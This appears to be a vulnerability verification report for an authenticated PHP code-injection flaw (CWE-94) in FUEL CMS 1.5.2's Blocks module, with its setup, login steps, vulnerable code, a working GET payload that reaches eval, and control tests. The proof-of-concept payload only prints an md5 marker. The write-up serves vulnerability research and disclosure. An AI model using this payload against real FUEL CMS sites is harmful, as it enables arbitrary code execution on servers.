@@ -1,0 +1,52 @@
+FUE-01: Authenticated PHP code evaluation in Blocks::layout_fields via 'name' GET parameter
+Target: FUEL CMS 1.5.2 (CI 3.1.13), fuel/modules/fuel/controllers/Blocks.php:253-265
+Local env: throwaway MySQL 8.0.39 on 127.0.0.1:3307 (db "fuelcms" from fuel/install/fuel_schema.sql),
+php -S 127.0.0.1:8081 + router, admin login performed over HTTP with session cookie.
+Setup notes (preconditions only, vulnerable code untouched):
+- DB config pointed at local temp instance; session save path set (Windows php -S).
+- $config['admin_enabled'] = TRUE in MY_fuel.php (stock default is FALSE; enabling the admin is the
+  normal deployed configuration and is a prerequisite of any authenticated admin-panel bug).
+- A block layout was registered in application/config/MY_fuel_layouts.php:
+  $config['blocks']['verify_block'] = array('label'=>'Verify Block','fields'=>array('copy'=>array('type'=>'textarea','label'=>'Copy')));
+  This is the documented way sites configure the Blocks module (see fuel/modules/fuel/views/_docs/general/layouts.php
+  around L201/L248: "Block layouts are added to the $config['blocks']..."). Without ANY block layout
+  configured, layout_fields() returns early before the eval - so exploitation requires a site that
+  uses the Blocks module with a registered block layout (its intended usage).
+- Admin password set locally: fuel_users.password = SHA1(CONCAT('<REDACTED>', salt)) matching the
+  app's own hashing (fuel_users_model::salted_password_hash = sha1(password.salt)).
+- PHP 8.4 compat patch on CI index.php error_reporting only (stage3-local-compat), unrelated to the vuln.
+
+--- Step 1: login (admin / <REDACTED>) ---
+GET /index.php/fuel/login -> 200 (form contains ci_csrf_token_FUEL)
+POST /index.php/fuel/login  user_name=admin&password=<REDACTED>&Login=Login&ci_csrf_token_FUEL=<session token>
+-> HTTP 302 -> /index.php/fuel/dashboard -> 200 "FUEL CMS : Dashboard"
+
+--- Step 2: PoC - eval of attacker-controlled string ---
+The vulnerable code path (Blocks::layout_fields):
+    $name_parts = explode('--', $_name);  $_name = end($name_parts);
+    $_name_var = str_replace(array('[',']'), array('["','"]'), $_name);
+    $_name_var_eval = '@$_name = (isset($'.$_name_var.')) ? $'.$_name_var.' : "";';
+    @eval($_name_var_eval);          // L264 - reached only when $id segment is non-empty (L183/L253)
+
+Request (admin session cookie):
+GET /index.php/fuel/blocks/layout_fields/verify_block/1?name=a)); echo("FUELEVAL-".md5("fuel-poc")); //
+name= parameter passes input->get('name',TRUE) (XSS filter only, no PHP-code sanitization).
+The eval string becomes: @$_name = (isset($a)); echo("FUELEVAL-".md5("fuel-poc")); //)) ? $a)); ... : "";
+(everything after "//" is a line comment)
+
+Response: HTTP 200, page body contains:
+    FUELEVAL-5dfc072c655ea55ead079f0cb689c4ce
+md5("fuel-poc") = 5dfc072c655ea55ead079f0cb689c4ce (computed independently) => arbitrary PHP code executed.
+Payload only echoes an md5 marker (no system()/shell calls).
+
+--- Step 3: controls ---
+a) Same request WITHOUT session cookie:
+   -> HTTP 302 redirect to /fuel/login/... (Fuel_base_controller auth gate) - no eval. So the bug is
+      authenticated (admin session, blocks permission).
+b) Same payload WITHOUT the id segment (/layout_fields/verify_block?name=...):
+   -> HTTP 200 normal field-form render, NO marker (eval block requires non-empty $id).
+c) With id but no name parameter: HTTP 200 normal render, no eval of user input.
+
+Verdict: VERIFIED - authenticated (admin) PHP code injection via GET name -> @eval (CWE-94).
+Preconditions: (1) valid admin session with blocks access; (2) a block layout registered in
+$config['blocks'] (standard Blocks-module configuration); (3) any non-empty :id URI segment.
